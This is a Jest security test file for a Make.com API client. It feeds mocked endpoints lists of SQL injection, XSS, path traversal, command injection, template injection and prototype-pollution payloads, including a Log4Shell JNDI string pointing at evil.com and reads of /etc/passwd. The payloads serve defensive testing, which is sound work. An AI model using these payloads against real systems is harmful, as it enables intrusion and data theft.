/**
 * Comprehensive Security Testing Suite
 * Tests for authentication, authorization, input validation, and XSS/SQL injection prevention
 */

import { jest, describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { MakeApiClient } from '../../src/lib/make-api-client.js';
import { testUsers, testErrors } from '../fixtures/test-data.js';
import { createMockServer } from '../utils/test-helpers.js';

describe('Security Testing Suite', () => {
  let mockApiClient: MakeApiClient;
  let mockServer: any;

  beforeEach(() => {
    const serverSetup = createMockServer();
    mockServer = serverSetup.server;
    mockApiClient = new MakeApiClient({
      apiKey: 'test-api-key',
      baseUrl: 'https://api.make.com/v2'
    });
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "1' UNION SELECT * FROM users--",
      "' OR 1=1--",
      "admin'--",
      "') OR ('1'='1'--",
      "' UNION SELECT password FROM users WHERE username='admin'--",
      "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
      "1'; EXEC xp_cmdshell('dir'); --"
    ];

    describe('User Authentication Endpoints', () => {
      sqlInjectionPayloads.forEach((payload, index) => {
        it(`should safely handle SQL injection payload ${index + 1}: ${payload.substring(0, 30)}...`, async () => {
          // Mock API response for malicious input
          jest.spyOn(mockApiClient, 'get').mockResolvedValue({
            success: false,
            error: {
              message: 'Invalid credentials',
              code: 'UNAUTHORIZED'
            }
          });

          try {
            await mockApiClient.get('/users', {
              search: payload,
              filter: payload
            });
          } catch (error: any) {
            // Should not contain SQL error messages
            expect(error.message).not.toMatch(/SQL|syntax|grammar|database/i);
            expect(error.message).not.toContain('DROP');
            expect(error.message).not.toContain('UNION');
            expect(error.message).not.toContain('SELECT');
          }

          expect(mockApiClient.get).toHaveBeenCalledWith('/users', {
            search: payload,
            filter: payload
          });
        });
      });
    });

    describe('Scenario Search and Filtering', () => {
      sqlInjectionPayloads.forEach((payload, index) => {
        it(`should sanitize scenario search payload ${index + 1}`, async () => {
          jest.spyOn(mockApiClient, 'get').mockResolvedValue({
            success: true,
            data: { scenarios: [] }
          });

          const result = await mockApiClient.get('/scenarios', {
            name: payload,
            description: payload
          });

          expect(result.data.scenarios).toEqual([]);
          expect(mockApiClient.get).toHaveBeenCalledWith('/scenarios', {
            name: payload,
            description: payload
          });
        });
      });
    });
  });

  describe('XSS Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>',
      '<video><source onerror="alert(1)">',
      '<audio src=x onerror=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '<marquee onstart=alert("XSS")>'
    ];

    describe('Scenario Description Sanitization', () => {
      xssPayloads.forEach((payload, index) => {
        it(`should sanitize XSS payload ${index + 1}: ${payload.substring(0, 30)}...`, async () => {
          jest.spyOn(mockApiClient, 'post').mockResolvedValue({
            success: true,
            data: {
              id: 'test-scenario-id',
              name: 'Test Scenario',
              description: payload // This should be sanitized on the server side
            }
          });

          const result = await mockApiClient.post('/scenarios', {
            name: 'Test Scenario',
            description: payload
          });

          // Verify the payload was sent but would be sanitized server-side
          expect(mockApiClient.post).toHaveBeenCalledWith('/scenarios', {
            name: 'Test Scenario',
            description: payload
          });
          
          // In a real implementation, the server would sanitize this
          expect(result.success).toBe(true);
        });
      });
    });

    describe('Connection Name Validation', () => {
      xssPayloads.forEach((payload, index) => {
        it(`should validate connection name against XSS payload ${index + 1}`, async () => {
          jest.spyOn(mockApiClient, 'post').mockResolvedValue({
            success: false,
            error: {
              message: 'Invalid connection name format',
              code: 'VALIDATION_ERROR'
            }
          });

          try {
            await mockApiClient.post('/connections', {
              name: payload,
              service: 'gmail'
            });
          } catch (error: any) {
            expect(error.message).toContain('Invalid');
            expect(error.message).not.toContain('<script>');
            expect(error.message).not.toContain('javascript:');
            expect(error.message).not.toContain('onerror=');
          }

          expect(mockApiClient.post).toHaveBeenCalledWith('/connections', {
            name: payload,
            service: 'gmail'
          });
        });
      });
    });
  });

  describe('Authentication Security', () => {
    describe('Brute Force Protection', () => {
      it('should implement rate limiting for authentication attempts', async () => {
        const username = 'testuser@example.com';
        const failedAttempts = 5;

        // Mock failed login attempts
        jest.spyOn(mockApiClient, 'post').mockResolvedValue({
          success: false,
          error: {
            message: 'Invalid credentials',
            code: 'UNAUTHORIZED'
          }
        });

        // Simulate multiple failed attempts
        for (let i = 0; i < failedAttempts; i++) {
          try {
            await mockApiClient.post('/auth/login', {
              email: username,
              password: 'wrongpassword'
            });
          } catch (error) {
            // Expected to fail
          }
        }

        // Mock rate limiting response
        jest.spyOn(mockApiClient, 'post').mockResolvedValue({
          success: false,
          error: {
            message: 'Account temporarily locked due to too many failed attempts',
            code: 'RATE_LIMITED',
            details: {
              retryAfter: 300,
              lockoutDuration: 300
            }
          }
        });

        // Next attempt should be rate limited
        try {
          await mockApiClient.post('/auth/login', {
            email: username,
            password: 'correctpassword'
          });
        } catch (error: any) {
          expect(error.code).toBe('RATE_LIMITED');
          expect(error.details.retryAfter).toBeGreaterThan(0);
        }

        expect(mockApiClient.post).toHaveBeenCalledTimes(failedAttempts + 1);
      });

      it('should track failed attempts by IP address', async () => {
        const ipAddress = '192.168.1.100';
        
        jest.spyOn(mockApiClient, 'post').mockImplementation(async (url, data, options) => {
          if (options?.headers?.['X-Forwarded-For'] === ipAddress) {
            return {
              success: false,
              error: {
                message: 'IP address temporarily blocked',
                code: 'IP_BLOCKED',
                details: { blockedUntil: Date.now() + 300000 }
              }
            };
          }
          return { success: true, data: {} };
        });

        try {
          await mockApiClient.post('/auth/login', 
            { email: 'test@example.com', password: 'password' },
            { headers: { 'X-Forwarded-For': ipAddress } }
          );
        } catch (error: any) {
          expect(error.code).toBe('IP_BLOCKED');
        }
      });
    });

    describe('Session Security', () => {
      it('should invalidate sessions on password change', async () => {
        const sessionToken = 'valid-session-token';

        // Mock successful password change
        jest.spyOn(mockApiClient, 'post').mockResolvedValue({
          success: true,
          data: { message: 'Password updated successfully' }
        });

        await mockApiClient.post('/auth/change-password', {
          oldPassword: 'oldpassword',
          newPassword: 'newpassword'
        });

        // Mock subsequent request with old session token
        jest.spyOn(mockApiClient, 'get').mockResolvedValue({
          success: false,
          error: {
            message: 'Session invalid - password was changed',
            code: 'SESSION_INVALIDATED'
          }
        });

        try {
          await mockApiClient.get('/user/profile');
        } catch (error: any) {
          expect(error.code).toBe('SESSION_INVALIDATED');
        }
      });

      it('should expire sessions after inactivity', async () => {
        jest.spyOn(mockApiClient, 'get').mockResolvedValue({
          success: false,
          error: {
            message: 'Session expired due to inactivity',
            code: 'SESSION_EXPIRED',
            details: { 
              expiredAt: Date.now() - 3600000,
              maxInactivity: 3600000
            }
          }
        });

        try {
          await mockApiClient.get('/user/profile');
        } catch (error: any) {
          expect(error.code).toBe('SESSION_EXPIRED');
          expect(error.details.maxInactivity).toBe(3600000);
        }
      });

      it('should require re-authentication for sensitive operations', async () => {
        jest.spyOn(mockApiClient, 'delete').mockResolvedValue({
          success: false,
          error: {
            message: 'Re-authentication required for account deletion',
            code: 'REAUTH_REQUIRED',
            details: { requiredAuthLevel: 'password' }
          }
        });

        try {
          await mockApiClient.delete('/user/account');
        } catch (error: any) {
          expect(error.code).toBe('REAUTH_REQUIRED');
          expect(error.details.requiredAuthLevel).toBeTruthy();
        }
      });
    });
  });

  describe('Authorization Security', () => {
    describe('Permission Validation', () => {
      it('should enforce role-based access control', async () => {
        const viewerUser = testUsers.viewer;

        jest.spyOn(mockApiClient, 'post').mockResolvedValue({
          success: false,
          error: {
            message: 'Insufficient permissions - admin role required',
            code: 'INSUFFICIENT_PERMISSIONS',
            details: { 
              requiredRole: 'admin',
              currentRole: 'viewer',
              requiredPermissions: ['admin', 'manage_users']
            }
          }
        });

        try {
          await mockApiClient.post('/admin/users', {
            name: 'New User',
            email: 'newuser@example.com'
          });
        } catch (error: any) {
          expect(error.code).toBe('INSUFFICIENT_PERMISSIONS');
          expect(error.details.requiredRole).toBe('admin');
          expect(error.details.currentRole).toBe('viewer');
        }
      });

      it('should validate resource ownership', async () => {
        jest.spyOn(mockApiClient, 'get').mockResolvedValue({
          success: false,
          error: {
            message: 'Access denied - resource belongs to different user',
            code: 'ACCESS_DENIED',
            details: { 
              resourceId: 'private-scenario-123',
              ownerId: 'other-user-id'
            }
          }
        });

        try {
          await mockApiClient.get('/scenarios/private-scenario-123');
        } catch (error: any) {
          expect(error.code).toBe('ACCESS_DENIED');
          expect(error.details.resourceId).toBeTruthy();
        }
      });

      it('should enforce team-based access controls', async () => {
        jest.spyOn(mockApiClient, 'get').mockResolvedValue({
          success: false,
          error: {
            message: 'Access denied - resource not shared with your team',
            code: 'TEAM_ACCESS_DENIED',
            details: { 
              resourceTeamId: 'team-456',
              userTeamId: 'team-123'
            }
          }
        });

        try {
          await mockApiClient.get('/scenarios/team-scenario-456');
        } catch (error: any) {
          expect(error.code).toBe('TEAM_ACCESS_DENIED');
          expect(error.details.resourceTeamId).not.toBe(error.details.userTeamId);
        }
      });
    });
  });

  describe('Input Validation Security', () => {
    describe('Parameter Injection Prevention', () => {
      it('should validate URL parameters', async () => {
        const maliciousParams = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '/dev/null; cat /etc/passwd',
          '$(whoami)',
          '`id`',
          '${jndi:ldap://evil.com/exploit}',
          '{{7*7}}',
          '<%= 7*7 %>',
          '#{7*7}'
        ];

        for (const param of maliciousParams) {
          jest.spyOn(mockApiClient, 'get').mockResolvedValue({
            success: false,
            error: {
              message: 'Invalid parameter format',
              code: 'VALIDATION_ERROR'
            }
          });

          try {
            await mockApiClient.get(`/scenarios/${encodeURIComponent(param)}`);
          } catch (error: any) {
            expect(error.code).toBe('VALIDATION_ERROR');
            expect(error.message).not.toContain('passwd');
            expect(error.message).not.toContain('system32');
          }
        }
      });

      it('should validate JSON payload structure', async () => {
        const maliciousPayloads = [
          { __proto__: { admin: true } },
          { constructor: { prototype: { admin: true } } },
          'function(){return process.env}()',
          { eval: 'process.exit(1)' },
          { $where: 'this.admin === true' }
        ];

        for (const payload of maliciousPayloads) {
          jest.spyOn(mockApiClient, 'post').mockResolvedValue({
            success: false,
            error: {
              message: 'Invalid payload structure',
              code: 'INVALID_PAYLOAD'
            }
          });

          try {
            await mockApiClient.post('/scenarios', payload);
          } catch (error: any) {
            expect(error.code).toBe('INVALID_PAYLOAD');
          }
        }
      });
    });

    describe('File Upload Security', () => {
      it('should validate file types and sizes', async () => {
        const maliciousFiles = [
          { name: 'evil.exe', type: 'application/x-executable' },
          { name: 'script.php', type: 'application/x-php' },
          { name: 'payload.jsp', type: 'application/java-server-page' },
          { name: 'backdoor.asp', type: 'application/x-asp' },
          { name: 'virus.bat', type: 'application/x-bat' }
        ];

        for (const file of maliciousFiles) {
          jest.spyOn(mockApiClient, 'post').mockResolvedValue({
            success: false,
            error: {
              message: 'File type not allowed',
              code: 'INVALID_FILE_TYPE',
              details: { allowedTypes: ['image/png', 'image/jpeg', 'application/json'] }
            }
          });

          try {
            await mockApiClient.post('/templates/upload', {
              file: file,
              templateId: 'test-template'
            });
          } catch (error: any) {
            expect(error.code).toBe('INVALID_FILE_TYPE');
            expect(error.details.allowedTypes).toContain('image/png');
          }
        }
      });
    });
  });

  describe('API Security Headers', () => {
    it('should validate security headers are present', async () => {
      jest.spyOn(mockApiClient, 'get').mockImplementation(async () => {
        // Mock response with security headers validation
        return {
          success: true,
          data: {},
          headers: {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'",
            'Referrer-Policy': 'strict-origin-when-cross-origin'
          }
        };
      });

      const response = await mockApiClient.get('/scenarios');
      
      expect(response.headers?.['X-Content-Type-Options']).toBe('nosniff');
      expect(response.headers?.['X-Frame-Options']).toBe('DENY');
      expect(response.headers?.['X-XSS-Protection']).toBeTruthy();
      expect(response.headers?.['Strict-Transport-Security']).toContain('max-age');
      expect(response.headers?.['Content-Security-Policy']).toContain("default-src 'self'");
    });
  });

  describe('Rate Limiting Security', () => {
    it('should enforce API rate limits', async () => {
      const rateLimitResponse = {
        success: false,
        error: {
          message: 'Rate limit exceeded',
          code: 'RATE_LIMITED',
          details: {
            limit: 100,
            remaining: 0,
            resetTime: Date.now() + 60000,
            retryAfter: 60
          }
        }
      };

      jest.spyOn(mockApiClient, 'get').mockResolvedValue(rateLimitResponse);

      try {
        await mockApiClient.get('/scenarios');
      } catch (error: any) {
        expect(error.code).toBe('RATE_LIMITED');
        expect(error.details.limit).toBe(100);
        expect(error.details.remaining).toBe(0);
        expect(error.details.retryAfter).toBeGreaterThan(0);
      }
    });

    it('should implement sliding window rate limiting', async () => {
      let requestCount = 0;
      
      jest.spyOn(mockApiClient, 'get').mockImplementation(async () => {
        requestCount++;
        
        if (requestCount > 10) {
          return {
            success: false,
            error: {
              message: 'Rate limit exceeded - sliding window',
              code: 'RATE_LIMITED',
              details: {
                windowMs: 60000,
                maxRequests: 10,
                currentRequests: requestCount
              }
            }
          };
        }
        
        return { success: true, data: {} };
      });

      // Make requests that exceed the sliding window limit
      for (let i = 0; i < 12; i++) {
        try {
          await mockApiClient.get('/scenarios');
        } catch (error: any) {
          if (i >= 10) {
            expect(error.code).toBe('RATE_LIMITED');
            expect(error.details.maxRequests).toBe(10);
          }
        }
      }
    });
  });
});